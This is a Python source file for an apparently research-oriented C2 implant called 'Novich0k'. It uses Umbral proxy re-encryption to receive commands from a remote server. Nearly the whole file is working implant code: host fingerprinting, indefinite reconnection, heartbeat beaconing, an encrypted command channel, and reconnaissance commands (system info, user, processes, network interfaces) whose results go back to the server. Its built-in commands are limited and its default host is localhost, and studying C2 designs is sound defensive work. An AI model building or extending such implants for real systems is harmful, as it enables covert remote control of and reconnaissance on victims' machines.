#!/usr/bin/env python3
# Enhanced Novich0k - Umbral PRE-Based C2 Client Implementation
# For defensive security research purposes only

import socket
import time
import json
import base64
import sys
import os
import platform
import argparse
import logging
from datetime import datetime, timedelta
import random
import threading

# Import Umbral PRE libraries
from umbral import SecretKey, PublicKey, Signer
from umbral.curve import SECP256K1
from umbral.pre import encrypt, decrypt_original, decrypt_reencrypted, reencrypt
from umbral import Capsule, CapsuleFrag

# Import utility modules
from utils.serialization import serialize_object, deserialize_object, create_message, validate_message
from utils.error_types import NovichokError, DeserializationError, SerializationError, VersionError, CapsuleError
from utils.message_buffer import MessageBuffer
from utils.schema_validation import validate_json_schema
from utils.connection import send_message_with_retry, receive_message_with_timeout

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("novich0k_client.log")
    ]
)

logger = logging.getLogger("Novich0k-Client")

class UmbralClient:
    """Enhanced client implementation using Umbral PRE for secure communication"""
    
    def __init__(self, server_host='127.0.0.1', server_port=8888):
        """Initialize the client"""
        self.server_host = server_host
        self.server_port = server_port
        self.client_socket = None
        self.message_buffer = MessageBuffer()
        
        # Initialize Umbral parameters
        self.params = SECP256K1
        
        # Generate client keys
        self.private_key = SecretKey.random()
        self.public_key = self.private_key.public_key()
        
        # Generate signing keys
        self.signing_key = SecretKey.random()
        self.verifying_key = self.signing_key.public_key()
        self.signer = Signer(self.signing_key)
        
        # Server's public key (obtained during handshake)
        self.server_pubkey = None
        
        # Client identification
        try:
            self.client_id = self.generate_client_id()
        except Exception as e:
            logger.error(f"Error generating client ID: {e}")
            self.client_id = self.generate_random_id()
        
        # Operational flag
        self.running = False
        
        # Connection state
        self.connection_active = False
        self.reconnect_delay = 5  # Base delay in seconds
        self.max_reconnect_delay = 60  # Maximum delay in seconds
        self.reconnect_attempts = 0
        self.max_reconnect_attempts = 0  # 0 = unlimited attempts
        
        logger.info(f"Client initialized with ID {self.client_id}")
    
    def generate_client_id(self):
        """Generate a unique but somewhat persistent client ID"""
        # Use hardware identifiers when possible
        machine_id = ""
        
        try:
            if platform.system() == "Windows":
                import subprocess
                output = subprocess.check_output("wmic csproduct get uuid", shell=True)
                machine_id = output.decode().split("\n")[1].strip()
            elif platform.system() == "Linux":
                if os.path.exists("/etc/machine-id"):
                    with open("/etc/machine-id", "r") as f:
                        machine_id = f.read().strip()
            elif platform.system() == "Darwin":  # macOS
                import subprocess
                output = subprocess.check_output(["system_profiler", "SPHardwareDataType"])
                for line in output.decode().split("\n"):
                    if "Hardware UUID" in line:
                        machine_id = line.split(":")[1].strip()
        except Exception as e:
            logger.warning(f"Error getting machine ID: {e}")
            return self.generate_random_id()
        
        # Create a hash of the machine_id
        import hashlib
        hashed = hashlib.sha256(machine_id.encode()).hexdigest()
        
        return hashed[:16]
    
    def generate_random_id(self):
        """Generate a random client ID"""
        return f"{platform.node()}-{platform.machine()}-{random.randint(1000, 9999)}"
    
    def connect(self):
        """Connect to the C2 server and perform key exchange"""
        try:
            # Close existing socket if any
            if self.client_socket:
                try:
                    self.client_socket.close()
                except Exception as e:
                    logger.warning(f"Error closing existing socket: {e}")
                self.client_socket = None
            
            # Create a new socket
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((self.server_host, self.server_port))
            logger.info(f"Connected to server at {self.server_host}:{self.server_port}")
            
            # Reset message buffer
            self.message_buffer.clear()
            
            # Send client's public key using the new message format
            key_data = create_message({
                'public_key': serialize_object(self.public_key, "key"),
                'verifying_key': serialize_object(self.verifying_key, "key"),
                'client_id': self.client_id
            }, "key_exchange")
            
            send_message_with_retry(self.client_socket, key_data)
            logger.info("Sent public key to server")
            
            # Receive server's response with public key
            response_data = receive_message_with_timeout(self.client_socket)
            
            if not response_data:
                logger.error("No response received from server during key exchange")
                return False
            
            try:
                validate_message(response_data)
            except Exception as e:
                logger.error(f"Invalid message format from server: {e}")
                return False
            
            if response_data.get("message_type") == "key_exchange_response" and response_data.get("payload", {}).get("status") == "connected":
                # Store server's public key
                try:
                    server_pubkey_str = response_data.get("payload", {}).get("public_key")
                    self.server_pubkey = deserialize_object(server_pubkey_str, "key")
                    logger.info("Key exchange completed successfully")
                    print("[+] Successfully connected to C2 server")
                    
                    # Reset reconnection parameters
                    self.reconnect_attempts = 0
                    self.reconnect_delay = 5
                    
                    # Update state
                    self.running = True
                    self.connection_active = True
                    
                    # Start the command loop
                    command_thread = threading.Thread(target=self.command_loop)
                    command_thread.daemon = True
                    command_thread.start()
                    
                    return True
                except Exception as e:
                    logger.error(f"Error processing server's public key: {e}")
                    return False
            else:
                logger.error("Failed to complete key exchange")
                print("[!] Failed to complete key exchange with server")
                self.connection_active = False
                return False
                
        except Exception as e:
            logger.error(f"Connection error: {e}")
            print(f"[!] Error connecting to server: {e}")
            self.connection_active = False
            return False
    
    def is_connected(self):
        """Check if the client socket is still connected"""
        if not self.client_socket:
            return False
        
        try:
            # This is a non-blocking way to check connection status
            self.client_socket.getpeername()
            return True
        except Exception:
            return False
    
    def maintain_connection(self):
        """Keep connection alive with automatic reconnection"""
        while True:
            try:
                if not self.running:
                    # Client is intentionally shut down
                    break
                
                # Check connection status
                if not self.is_connected() or not self.connection_active:
                    logger.warning("Connection to server lost or inactive")
                    
                    # Check if we're already at the maximum number of attempts
                    if self.max_reconnect_attempts > 0 and self.reconnect_attempts >= self.max_reconnect_attempts:
                        logger.error(f"Max reconnection attempts ({self.max_reconnect_attempts}) reached. Giving up.")
                        print(f"[!] Failed to reconnect after {self.max_reconnect_attempts} attempts. Exiting...")
                        self.running = False
                        break
                    
                    # Increment attempt counter
                    self.reconnect_attempts += 1
                    
                    # Apply exponential backoff with jitter
                    jitter = random.uniform(0.8, 1.2)
                    current_delay = min(self.reconnect_delay * jitter, self.max_reconnect_delay)
                    
                    logger.info(f"Attempting to reconnect in {current_delay:.1f} seconds (attempt {self.reconnect_attempts})")
                    print(f"[*] Connection lost. Reconnecting in {current_delay:.1f} seconds (attempt {self.reconnect_attempts})...")
                    
                    # Wait before attempting to reconnect
                    time.sleep(current_delay)
                    
                    # Attempt to reconnect
                    if self.connect():
                        logger.info("Successfully reconnected to server")
                        print("[+] Successfully reconnected to server")
                    else:
                        # Increase backoff delay for next attempt
                        self.reconnect_delay = min(self.reconnect_delay * 1.5, self.max_reconnect_delay)
                else:
                    # Connection is healthy, just sleep
                    time.sleep(5)
                    
            except Exception as e:
                logger.error(f"Error in connection maintenance: {e}")
                time.sleep(5)
    
    def command_loop(self):
        """Main loop to receive and process commands"""
        print("\n[*] Waiting for commands from C2 server...")
        
        while self.running:
            try:
                if not self.is_connected():
                    logger.warning("Socket disconnected in command loop")
                    self.connection_active = False
                    break
                
                # Set a timeout to periodically check connection state
                self.client_socket.settimeout(30)
                
                try:
                    # Receive a message using our improved message handling
                    message = receive_message_with_timeout(self.client_socket)
                    
                    if not message:
                        continue  # No complete message yet
                    
                    # Validate the message structure
                    try:
                        validate_message(message)
                    except Exception as e:
                        logger.error(f"Received invalid message format: {e}")
                        continue
                    
                    message_type = message.get("message_type")
                    payload = message.get("payload", {})
                    
                    # Check if this is a command message
                    if message_type == "command" and payload.get("command"):
                        # Process command based on encryption type
                        if "encrypted_data" in payload:
                            self.process_direct_command(payload["encrypted_data"])
                        elif "proxy_package" in payload:
                            self.process_reencrypted_command(payload["proxy_package"])
                
                except socket.timeout:
                    # No data received, but connection may still be active
                    # This is fine, just continue the loop
                    continue
                except ConnectionResetError:
                    logger.warning("Connection reset by server")
                    print("[!] Connection reset by server")
                    self.connection_active = False
                    break
                
            except json.JSONDecodeError:
                logger.error("Received invalid JSON data")
            except KeyboardInterrupt:
                logger.info("Client interrupted by user")
                print("\n[*] Client interrupted by user")
                self.running = False
                break
            except Exception as e:
                logger.error(f"Error in command loop: {e}")
                print(f"[!] Error: {e}")
                time.sleep(1)  # Prevent tight loop on persistent errors
                
                # Check if this is a socket error
                if isinstance(e, (socket.error, ConnectionError)):
                    self.connection_active = False
                    break
    
    def process_direct_command(self, encrypted_data):
        """Process a directly encrypted command with improved error handling"""
        try:
            # Deserialize and decrypt the command
            ciphertext = base64.b64decode(encrypted_data['ciphertext'])
            capsule_bytes = base64.b64decode(encrypted_data['capsule'])
            
            try:
                # Reconstruct the capsule with error handling
                capsule = Capsule.from_bytes(capsule_bytes)
            except Exception as e:
                raise CapsuleError(f"Invalid capsule format: {e}")
            
            try:
                # Decrypt the message with better error handling
                plaintext = decrypt_original(
                    delegating_sk=self.private_key,
                    capsule=capsule,
                    ciphertext=ciphertext
                )
            except Exception as e:
                raise CapsuleError(f"Failed to decrypt command: {e}")
            
            # Parse and validate command data
            try:
                command_data = json.loads(plaintext.decode())
                valid, error_msg = validate_json_schema(command_data, "command")
                if not valid:
                    raise DeserializationError(f"Invalid command format: {error_msg}")
            except json.JSONDecodeError as e:
                raise DeserializationError(f"Invalid JSON in decrypted command: {e}")
            
            # Execute the command
            self.execute_command(command_data)
            
        except CapsuleError as e:
            logger.error(f"Capsule error: {e}")
            print(f"[!] Error processing command capsule: {e}")
        except DeserializationError as e:
            logger.error(f"Deserialization error: {e}")
            print(f"[!] Error processing command format: {e}")
        except Exception as e:
            logger.error(f"Error processing direct command: {e}")
            print(f"[!] Error processing command: {e}")
    
    def process_reencrypted_command(self, proxy_package):
        """Process a command that was re-encrypted by the proxy with improved error handling"""
        try:
            logger.info("Processing re-encrypted command via proxy")
            print("[*] Received re-encrypted command via proxy")
            
            # Extract and validate components
            if not all(k in proxy_package for k in ['ciphertext', 'capsule', 'cfrags', 'delegating_pk']):
                raise DeserializationError("Incomplete proxy package")
            
            try:
                ciphertext = base64.b64decode(proxy_package['ciphertext'])
                capsule = Capsule.from_bytes(base64.b64decode(proxy_package['capsule']))
                cfrag_bytes_list = proxy_package['cfrags']
                delegating_pk_bytes = proxy_package['delegating_pk']
            except Exception as e:
                raise DeserializationError(f"Error decoding proxy package components: {e}")
            
            # Deserialize the delegating public key
            try:
                delegating_pk = deserialize_object(delegating_pk_bytes, "key")
            except Exception as e:
                raise DeserializationError(f"Invalid delegating public key: {e}")
            
            # Deserialize the capsule fragments with error handling
            try:
                cfrags = [
                    CapsuleFrag.from_bytes(base64.b64decode(cfrag)) 
                    for cfrag in cfrag_bytes_list
                ]
            except Exception as e:
                raise CapsuleError(f"Error deserializing capsule fragments: {e}")
            
            # Decrypt the re-encrypted ciphertext with better error handling
            try:
                plaintext = decrypt_reencrypted(
                    receiving_sk=self.private_key,
                    delegating_pk=delegating_pk,
                    capsule=capsule,
                    verified_cfrags=cfrags,
                    ciphertext=ciphertext
                )
            except Exception as e:
                raise CapsuleError(f"Failed to decrypt re-encrypted command: {e}")
            
            # Parse and validate command data
            try:
                command_data = json.loads(plaintext.decode())
                valid, error_msg = validate_json_schema(command_data, "command")
                if not valid:
                    raise DeserializationError(f"Invalid command format: {error_msg}")
            except json.JSONDecodeError as e:
                raise DeserializationError(f"Invalid JSON in decrypted command: {e}")
            
            # Execute the command
            self.execute_command(command_data)
            
        except CapsuleError as e:
            logger.error(f"Capsule error processing re-encrypted command: {e}")
            print(f"[!] Error processing re-encrypted command: {e}")
        except DeserializationError as e:
            logger.error(f"Deserialization error processing re-encrypted command: {e}")
            print(f"[!] Error processing re-encrypted command format: {e}")
        except Exception as e:
            logger.error(f"Error processing re-encrypted command: {e}")
            print(f"[!] Error processing re-encrypted command: {e}")
    
    def execute_command(self, command_data):
        """Execute a command and send response back to server"""
        command_id = command_data.get('id', 'unknown')
        command = command_data.get('command', '')
        
        logger.info(f"Executing command: {command}")
        print(f"[*] Executing command: {command}")
        
        try:
            # Execute the command
            result = self.run_command(command)
            
            # Send the response back
            self.send_response(command_id, result)
            
        except Exception as e:
            logger.error(f"Error executing command '{command}': {e}")
            print(f"[!] Error executing command: {e}")
            # Send error response
            self.send_response(command_id, f"Error: {str(e)}")
    
    def run_command(self, command):
        """Run a benign command and return the result"""
        # System information command
        if command == "sysinfo":
            return {
                "system": platform.system(),
                "node": platform.node(),
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "architecture": platform.architecture()[0],
                "python_version": platform.python_version()
            }
            
        # Current user command
        elif command == "whoami":
            try:
                import getpass
                return getpass.getuser()
            except:
                return "Unknown user"
            
        # Ping/connectivity test
        elif command == "ping":
            return "pong"
            
        # System uptime
        elif command == "uptime":
            try:
                if platform.system() == "Windows":
                    import ctypes
                    lib = ctypes.windll.kernel32
                    t = lib.GetTickCount64()
                    t = int(t / 1000)
                    return f"System uptime: {timedelta(seconds=t)}"
                else:
                    with open('/proc/uptime', 'r') as f:
                        uptime_seconds = float(f.readline().split()[0])
                        return f"System uptime: {timedelta(seconds=uptime_seconds)}"
            except:
                return "Could not determine system uptime"
            
        # Echo message
        elif command.startswith("echo "):
            message = command[5:]  # Remove 'echo ' prefix
            return f"Echo: {message}"
            
        # Sleep command
        elif command.startswith("sleep "):
            try:
                seconds = int(command.split(" ")[1])
                # Limit sleep time for safety
                seconds = min(seconds, 10)
                time.sleep(seconds)
                return f"Slept for {seconds} seconds"
            except ValueError:
                return "Invalid sleep command format"
                
        # List processes
        elif command == "processes":
            try:
                processes = []
                
                if platform.system() == "Windows":
                    import subprocess
                    output = subprocess.check_output("tasklist /FO CSV /NH", shell=True)
                    for line in output.decode().splitlines()[:10]:  # Limit to 10 processes
                        if line.strip():
                            parts = line.split('","')
                            name = parts[0].strip('"')
                            pid = parts[1].strip('"')
                            processes.append(f"{pid}: {name}")
                else:
                    try:
                        import psutil
                        for proc in psutil.process_iter(['pid', 'name'])[:10]:
                            processes.append(f"{proc.info['pid']}: {proc.info['name']}")
                    except ImportError:
                        # Fallback if psutil is not available
                        import subprocess
                        output = subprocess.check_output("ps aux | head -11", shell=True)
                        processes = output.decode().splitlines()[1:11]  # Skip header and limit to 10
                
                return processes
            except Exception as e:
                return f"Could not list processes: {str(e)}"
                
        # List network interfaces
        elif command == "interfaces":
            try:
                interfaces = []
                
                if platform.system() == "Windows":
                    import subprocess
                    output = subprocess.check_output("ipconfig", shell=True)
                    lines = output.decode().splitlines()
                    current_iface = None
                    for line in lines:
                        if line.strip() and not line.startswith(" "):
                            current_iface = line.strip()
                        elif "IPv4 Address" in line and current_iface:
                            ip = line.split(":")[1].strip()
                            interfaces.append(f"{current_iface} - {ip}")
                else:
                    try:
                        import psutil
                        for iface, addrs in psutil.net_if_addrs().items():
                            for addr in addrs:
                                if addr.family == socket.AF_INET:
                                    interfaces.append(f"{iface}: {addr.address}")
                    except ImportError:
                        # Fallback if psutil is not available
                        import subprocess
                        output = subprocess.check_output("ifconfig || ip addr", shell=True)
                        # This is a simplified parsing - would need more robust parsing in production
                        lines = output.decode().splitlines()
                        for i, line in enumerate(lines):
                            if "inet " in line and i > 0:
                                iface_line = lines[i-1]
                                iface = iface_line.split(":")[0]
                                ip = line.split("inet ")[1].split(" ")[0]
                                interfaces.append(f"{iface}: {ip}")
                
                return interfaces
            except Exception as e:
                return f"Could not list network interfaces: {str(e)}"
        
        # Unknown command
        else:
            return f"Unknown command: {command}"
    
    def send_response(self, command_id, result):
        """Encrypt and send command response back to server with improved error handling"""
        if not self.server_pubkey:
            logger.error("No server public key available")
            return
        
        if not self.is_connected():
            logger.error("Cannot send response: not connected to server")
            return
        
        try:
            # Prepare response data
            response_data = {
                'id': command_id,
                'response': result,
                'timestamp': datetime.now().isoformat(),
                'client_id': self.client_id
            }
            
            # Validate the response format
            valid, error_msg = validate_json_schema(response_data, "response")
            if not valid:
                logger.error(f"Invalid response format: {error_msg}")
                response_data = {
                    'id': command_id,
                    'response': {"error": "Internal error generating response"},
                    'timestamp': datetime.now().isoformat(),
                    'client_id': self.client_id
                }
            
            # Convert to JSON string
            plaintext = json.dumps(response_data).encode()
            
            # Encrypt the response using Umbral PRE
            ciphertext, capsule = encrypt(self.server_pubkey, plaintext)
            
            # Note: diagnostic script showed that capsule is already a bytes object
            # in this version of Umbral, so no conversion is needed
            
            # Package the encrypted response using the new message format
            encrypted_response = create_message({
                'response': {
                    'ciphertext': base64.b64encode(ciphertext).decode(),
                    'capsule': base64.b64encode(capsule).decode(),  # capsule is already bytes
                    'client_id': self.client_id,
                    'timestamp': datetime.now().isoformat()
                }
            }, "response")
            
            # Send the encrypted response with retry
            send_message_with_retry(self.client_socket, encrypted_response)
            logger.info(f"Sent response for command {command_id}")
            
        except Exception as e:
            logger.error(f"Error sending response: {e}")
            print(f"[!] Error sending response: {e}")
            self.connection_active = False
    
    def disconnect(self):
        """Disconnect from the server"""
        self.running = False
        if self.client_socket:
            try:
                self.client_socket.close()
                logger.info("Disconnected from server")
                print("[*] Disconnected from server")
            except Exception as e:
                logger.error(f"Error during disconnect: {e}")
        self.connection_active = False
    
    def heartbeat(self, interval=60):
        """Send periodic heartbeats to the server"""
        while self.running:
            try:
                time.sleep(interval)
                if not self.running or not self.is_connected() or not self.connection_active:
                    # Skip heartbeat if not connected
                    continue
                
                # Prepare heartbeat data
                heartbeat_data = {
                    'type': 'heartbeat',
                    'client_id': self.client_id,
                    'timestamp': datetime.now().isoformat(),
                    'status': 'active'
                }
                
                # Encrypt heartbeat
                plaintext = json.dumps(heartbeat_data).encode()
                ciphertext, capsule = encrypt(self.server_pubkey, plaintext)
                
                # Package the encrypted heartbeat
                encrypted_heartbeat = create_message({
                    'heartbeat': {
                        'ciphertext': base64.b64encode(ciphertext).decode(),
                        'capsule': base64.b64encode(capsule).decode(),  # capsule is already bytes
                        'client_id': self.client_id
                    }
                }, "heartbeat")
                
                # Send the encrypted heartbeat
                send_message_with_retry(self.client_socket, encrypted_heartbeat)
                logger.debug("Sent heartbeat")
                
            except Exception as e:
                logger.error(f"Error sending heartbeat: {e}")
                # Do not break the heartbeat loop on error
    
    def start_heartbeat(self, interval=60):
        """Start heartbeat in a separate thread"""
        heartbeat_thread = threading.Thread(target=self.heartbeat, args=(interval,))
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
        logger.info(f"Started heartbeat thread with interval {interval}s")


def check_dependencies():
    """Check if all required dependencies are installed"""
    required = ["umbral", "socket", "json", "base64", "platform"]
    missing = []
    
    for module in required:
        try:
            __import__(module)
        except ImportError:
            missing.append(module)
    
    if missing:
        logger.warning(f"Missing dependencies: {', '.join(missing)}")
        return False
    
    return True


def main():
    """Main function to run the client"""
    parser = argparse.ArgumentParser(description="Enhanced Umbral PRE-Based C2 Client")
    parser.add_argument("--host", default="127.0.0.1", help="C2 server host")
    parser.add_argument("--port", type=int, default=8888, help="C2 server port")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    parser.add_argument("--heartbeat", type=int, default=60, help="Heartbeat interval in seconds")
    parser.add_argument("--max-reconnect", type=int, default=0, 
                        help="Maximum reconnection attempts (0 = unlimited)")
    
    args = parser.parse_args()
    
    # Configure logging level
    if args.debug:
        logger.setLevel(logging.DEBUG)
    
    # Check dependencies
    check_dependencies()
    
    print("\n=== Enhanced Novich0k - Umbral PRE-Based C2 Client ===")
    print("For defensive security research purposes only")
    print(f"Connecting to {args.host}:{args.port}...")
    
    client = UmbralClient(args.host, args.port)
    client.max_reconnect_attempts = args.max_reconnect
    
    try:
        # Connect to the server
        if client.connect():
            # Start connection maintenance thread
            connection_thread = threading.Thread(target=client.maintain_connection)
            connection_thread.daemon = True
            connection_thread.start()
            
            # Start heartbeat
            client.start_heartbeat(args.heartbeat)
            
            # Keep the main thread alive
            while client.running:
                time.sleep(1)
        else:
            print("[!] Failed to connect to server")
            sys.exit(1)
    
    except KeyboardInterrupt:
        print("\n[*] Client interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client.disconnect()


if __name__ == "__main__":
    main()
